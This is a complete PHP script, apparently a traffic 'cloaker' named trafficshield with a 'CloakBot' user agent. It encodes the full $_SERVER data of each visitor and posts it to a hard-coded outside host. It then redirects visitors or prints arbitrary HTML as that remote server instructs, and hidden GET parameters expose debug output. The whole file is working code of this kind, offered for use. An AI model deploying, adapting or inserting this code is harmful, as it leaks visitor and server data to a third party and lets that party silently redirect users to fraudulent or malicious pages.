<?php
class trafficshield
{
    private string $apiEndpoint;
    private int $responseTimeout = 20;
    private int $connectTimeout = 20;
    private array $httpHeaders = [];
    private string $encodedServerData;
    private ?string $userIdentifier = "PPUdg42XWw";
    private ?string $campaignIdentifier = "hgEaoqBech";
    private bool $isDebugMode = false;

    private const DEBUG_QUERY_PARAM = 'Vf5e78hgfhd';
    private const DEBUG_CAMPAIGN_PARAM = '4f5e78hgfhd';
    private const RESPONSE_TYPE_REDIRECT = 'redirection';
    private const RESPONSE_TYPE_INLINE = 'zrc';

    public function execute()
    {
        try {
            ini_set('display_errors', 1);
            ini_set('display_startup_errors', 1);
            error_reporting(E_ALL);

            $this->validateSystemRequirements();
            $this->processCampaignDebugParam();
            $this->initializeExecution();
        } catch (Throwable $e) {
            $this->logErrorAndExit($e);
        }
    }

    private function validateSystemRequirements(): void
    {
        try {
            if (version_compare(PHP_VERSION, '7.4', '<')) {
                throw new RuntimeException('!Error: PHP 7.4 or higher is required. Current version: ' . PHP_VERSION);
            }

            if (!extension_loaded('curl')) {
                throw new RuntimeException('!Error: cURL extension is not enabled.');
            }
        } catch (Throwable $e) {
            $this->logErrorAndExit($e);
        }
    }

    private function processCampaignDebugParam(): void
    {
        try {
            if (!isset($_GET[self::DEBUG_CAMPAIGN_PARAM])) {
                return;
            }

            header('Content-Type: text/plain');
            echo $this->campaignIdentifier ?? 'cid-not-found';
            exit;
        } catch (Throwable $e) {
            $this->logErrorAndExit($e);
        }
    }

    private function initializeExecution(): void
    {
        try {
            $this->configureApiEndpoint();
            $this->setupDebugMode();
            $this->encodeServerEnvironment();
            $this->buildHttpHeaders();
            $this->processApiRequest();
        } catch (Throwable $e) {
            $this->logErrorAndExit($e);
        }
    }

    private function setupDebugMode(): void
    {
        try {
            $this->isDebugMode = isset($_GET[self::DEBUG_QUERY_PARAM]);
        } catch (Throwable $e) {
            $this->logErrorAndExit($e);
        }
    }

    private function encodeServerEnvironment(): void
    {
        try {
            $this->encodedServerData = base64_encode(json_encode($_SERVER));
        } catch (Throwable $e) {
            $this->logErrorAndExit($e);
        }
    }

    private function buildHttpHeaders(): void
    {
        try {
            $this->httpHeaders = [
                sprintf('Content-Type: %s', 'application/json'),
                'Accept: application/json',
                'User-Agent: CloakBot/1.0', 
                'X-Timestamp: ' . gmdate('c'),
                'Connection: keep-alive',
                'X-UID: ' . ($this->userIdentifier ?? 'null'),
                'X-CID: ' . ($this->campaignIdentifier ?? 'null'),
            ];
        } catch (Throwable $e) {
            $this->logErrorAndExit($e);
        }
    }

    public function processApiRequest(): array
    {
        try {
            $requestData = $this->createRequestPayload();
            $attempts = 0;
            $maxRetries = 5;
            $response = null;
            $httpCode = 0;
            $curlError = null;

            do {
                $attempts++;

                $ch = curl_init($this->apiEndpoint);
                curl_setopt_array($ch, $this->setCurlOptions($requestData));

                $rawResponse = curl_exec($ch);
             
                $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                $curlError = curl_error($ch);

                $response = $this->decodeJsonResponse($rawResponse);

                $shouldRetry = !empty($curlError) || $httpCode < 200 || $httpCode >= 300;

                if (!$shouldRetry) {
                    break;
                }

            } while ($attempts < $maxRetries);

            $result = $this->formatResponseData($requestData, $httpCode, $curlError, $response);

            if ($this->isDebugMode) {
                $this->displayDebugInformation($result);
            }

            $this->handleServerResponse($response);

            return $result;
        } catch (Throwable $e) {
            $this->logErrorAndExit($e);
            return ['error' => $e->getMessage()];
        }
    }

    private function createRequestPayload(): array
    {
        try {
            return [
                'uid'     => $this->userIdentifier,
                'cid'     => $this->campaignIdentifier,
                'payload' => $this->encodedServerData,
            ];
        } catch (Throwable $e) {
            $this->logErrorAndExit($e);
            return [];
        }
    }

    private function setCurlOptions(array $payload): array
    {
        try {
            return [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_POST           => true,
                CURLOPT_HTTPHEADER     => $this->httpHeaders,
                CURLOPT_POSTFIELDS     => json_encode($payload),
                CURLOPT_TIMEOUT        => $this->responseTimeout,
                CURLOPT_CONNECTTIMEOUT => $this->connectTimeout,
                CURLOPT_SSL_VERIFYPEER => true,
            ];
        } catch (Throwable $e) {
            $this->logErrorAndExit($e);
            return [];
        }
    }

    private function decodeJsonResponse($raw): ?array
    {
        try {
            $decoded = json_decode($raw, true);
            return is_array($decoded) ? $decoded : null;
        } catch (Throwable $e) {
            $this->logErrorAndExit($e);
            return null;
        }
    }

    private function formatResponseData(array $payload, int $httpCode, string $error, ?array $response): array
    {
        try {
            return [
                'http_code' => $httpCode,
                'curl_error' => $error,
                'request_payload' => $payload,
                'response' => $response,
            ];
        } catch (Throwable $e) {
            $this->logErrorAndExit($e);
            return [];
        }
    }

    private function handleServerResponse(?array $response): void
    {
        try {
            if (isset($response['status']) && $response['status'] == 'error') {
                echo $response['message'] ?? 'Unknown error';
                exit;
            }
            if (isset($response['status']) && $response['status'] == 'none') {
                return;
            }
            
            if (isset($response['method'])) {  

              switch ($response['method'] ?? '') {
                  case self::RESPONSE_TYPE_REDIRECT:
                      header('Location: ' . $response['url'], false, (int) ($response['http_code'] ?? 302));
                      exit;

                  case self::RESPONSE_TYPE_INLINE:
                      echo $response['content'] ?? '';
                      exit;
              }
          }
        } catch (Throwable $e) {
            $this->logErrorAndExit($e);
        }
    }

    public function displayDebugInformation(array $data = []): void
    {
        try {
            echo "<pre>";
            echo "=========== TRACE INFO ===========";
            echo "Endpoint: {$this->apiEndpoint}";
            echo "--- Headers ---";
            print_r($this->httpHeaders);
            echo "--- Payload ---";
            print_r([
                'uid' => $this->userIdentifier,
                'cid' => $this->campaignIdentifier,
                'serverData' => $this->encodedServerData,
            ]);
            echo "--- Response ---";
            print_r($data);
            echo "==================================";
            echo "</pre>";
            exit;
        } catch (Throwable $e) {
            $this->logErrorAndExit($e);
        }
    }

    public function configureApiEndpoint(): void
    {
        try {
            $this->apiEndpoint = 'https://logicts.ink';
        } catch (Throwable $e) {
            $this->logErrorAndExit($e);
        }
    }

    private function logErrorAndExit(Throwable $e): void
    {
        http_response_code(500);
        if ($this->isDebugMode) {
            echo "<pre>ERROR: " . $e->getMessage() . "" . $e->getTraceAsString() . "</pre>";
        } else {
            echo "A system error occurred.";
        }
        exit;
    }
}

$cloak = new trafficshield();
$cloak->execute();
?>
